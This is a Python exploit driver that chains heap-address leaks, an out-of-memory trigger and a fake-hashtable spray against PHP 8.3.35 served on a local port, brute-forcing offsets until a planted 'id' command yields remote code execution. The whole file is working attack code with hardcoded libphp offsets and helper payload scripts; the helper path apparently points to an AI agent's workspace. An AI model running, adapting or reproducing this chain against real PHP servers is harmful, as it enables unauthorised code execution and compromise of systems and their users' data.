#!/usr/bin/env python3
"""8.3.35: exploit.py stage1+2 (leaks) + 9bie A2 cheap-OOM + 9bie B2 spray.
Scans S offset (fake-array = ht field position) for 8.3.35's heap layout.
"""
import os
import sys, os, time, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit

PORT = 18112
CMD = "id>/www/p1"
GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
TMP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp_8335")

def run9(script, args, timeout=180):
    cmd = [sys.executable, os.path.join(GH, f"gh_pure_{script}")] + args
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return (r.stdout or "") + (r.stderr or "")

def main():
    os.makedirs(TMP, exist_ok=True)
    t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=30, verbose=False)
    ex = exploit.Exploit(t, CMD, zif_offset=0x3ac080, dtor_offset=0x49ec50,
                         htdata_offset=0x690d8, huge_mb=256, verbose=False,
                         profile="bookworm")
    chunk = 0
    for _ in range(4):
        ex.rotate(); chunk = ex.stage1()
        if chunk: break
    if not chunk: print("[-] stage1 failed"); return 1
    print(f"[+] chunk=0x{chunk:x}", flush=True)
    libphp = 0
    for _ in range(4):
        ex.rotate(); libphp = ex.stage2()
        if libphp: break
    if not libphp: print("[-] stage2 failed"); return 1
    print(f"[+] libphp=0x{libphp:x}", flush=True)
    zif = libphp + 0x3ac080

    offsets = sorted(set(
        [0xF8398] +
        [0xF8398 + d for d in range(-0x30000, 0x30001, 0x2000)] +
        [o for o in range(0x1E000, 0x150001, 0x2000)]
    ))
    print(f"[*] scanning {len(offsets)} S offsets", flush=True)
    for off in offsets:
        # fresh worker (rotate, not restart -> same ASLR)
        ex.rotate()
        ht_file = os.path.join(TMP, "ht_s.bin")
        o1 = run9("mk_ht.py", [hex(chunk + off), hex(zif), CMD, ht_file], timeout=30)
        if not os.path.exists(ht_file):
            continue
        o2 = run9("cheap_oom_a.py", ["--port", str(PORT), "--parts", "880",
                                     "--depth", "64", "--fillers", "115"], timeout=120)
        time.sleep(0.3)
        o3 = run9("fake_ref_b.py", ["--port", str(PORT), "--vl", "384",
                                    "--n1", "500", "--n2", "495", "--rc", "1",
                                    "--ht-addr", hex(chunk + off), "--ht-file", ht_file],
                  timeout=120)
        time.sleep(0.8)
        status, body = t.get("/p1")
        hit = (status == 200 and b"uid=" in body)
        print(f"  S_off=0x{off:05x} -> {'HIT' if hit else 'miss'} ({status})", flush=True)
        if hit:
            print(f"[+] RCE! S_off=0x{off:x}: {body.decode('latin1').strip()}")
            return 0
    print("[-] no S offset worked")
    return 1

if __name__ == "__main__":
    sys.exit(main())
